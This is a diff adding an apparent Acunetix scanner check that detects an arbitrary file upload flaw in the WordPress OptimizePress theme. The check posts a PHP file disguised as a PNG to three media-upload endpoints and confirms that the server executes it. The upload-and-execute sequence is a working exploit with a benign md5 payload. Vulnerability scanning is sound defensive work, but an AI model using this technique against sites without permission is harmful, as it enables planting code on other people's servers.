@@ -1,0 +1,91 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************
+function alert(fname, job, path)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(job);
+	
+	if (path) 
+		ri.Details =  ri.Details + "Location of uploaded files: [blue]" + path + "[/blue]";	
+	
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************
+function test_optimizepress_file_upload(dir, path, mediaUploadURL){
+	if (!path.endsWith('/')) path = path + '/';	
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + mediaUploadURL;	
+	http.execute();	
+	
+	if (!http.wasError && (http.responseStatus == 200)){	
+		var vulnRegex = /<input name="imgpath" type="hidden" id="imgpath" value="([^"]+)" \/>/;
+		var m = vulnRegex.exec(http.response.body);            
+		if (m && m.length > 1) {
+			var rndStr = 900000 + random(99999);
+			var fname = 'acunetix-upload-' + rndStr + '.php';
+			var fnamePath = m[1];
+			
+			var http = new THTTPJob();
+			http.url = dir.url;
+			http.verb = 'POST';
+			http.uri = path + mediaUploadURL;
+			http.request.addHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary8YtGYMYxgLtZIhW1", true);
+			http.addCookies = true;	
+			
+			http.request.body = 
+		        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+		        'Content-Disposition: form-data; name="newcsimg"; filename="' + fname + '"' + CRLF() +
+		        'Content-Type: image/png' + CRLF() +
+		        '' + CRLF() +
+		        '<?php print(md5(acunetix)); ?>' + CRLF() +
+		        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+		        'Content-Disposition: form-data; name="button"' + CRLF() +
+		        '' + CRLF() +
+		        'Upload File' + CRLF() +
+		        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+		        'Content-Disposition: form-data; name="newcsimg"' + CRLF() +
+		        '' + CRLF() +
+		        '1' + CRLF() +				
+		        '------WebKitFormBoundary8YtGYMYxgLtZIhW1' + CRLF() +
+		        'Content-Disposition: form-data; name="imgpath"' + CRLF() +
+		        '' + CRLF() +
+		        fnamePath + CRLF() +
+		        '------WebKitFormBoundary8YtGYMYxgLtZIhW1--';
+		        	
+			http.execute();	
+			
+			if ((!http.wasError && http.responseStatus == 200)){
+				//trace('uploaded');
+				vulnRegex = /<input type="radio" name="cs_img" value="(.*)?(acunetix-upload-\d*\.php)"/;
+				m = vulnRegex.exec(http.response.body);            
+				if (m && m.length > 1) {
+					// confirm the upload
+					var uploadURL = m[1] + m[2];					
+				
+					var confirmhttp = new THTTPJob();
+					confirmhttp.url = new TURL(uploadURL);
+					confirmhttp.verb = 'GET';
+					confirmhttp.execute();
+					
+					var confirmd5 = "082119f75623eb7abd7bf357698ff66c";
+					if (!confirmhttp.wasError && (confirmhttp.responseStatus == 200) && confirmhttp.response.body.indexOf(confirmd5) != -1){
+						alert("Wordpress_OptimizePress_File_Upload.xml", confirmhttp, fnamePath);
+					}					
+				}									
+			}			
+		}	
+	}
+}
+var dir = getCurrentDirectory();
+test_optimizepress_file_upload(dir, dir.fullPath, '/wp-content/themes/OptimizePress/lib/admin/media-upload.php');
+test_optimizepress_file_upload(dir, dir.fullPath, '/wp-content/themes/OptimizePress/lib/admin/media-upload-lncthumb.php');
+test_optimizepress_file_upload(dir, dir.fullPath, '/wp-content/themes/OptimizePress/lib/admin/media-upload-sq_button.php');
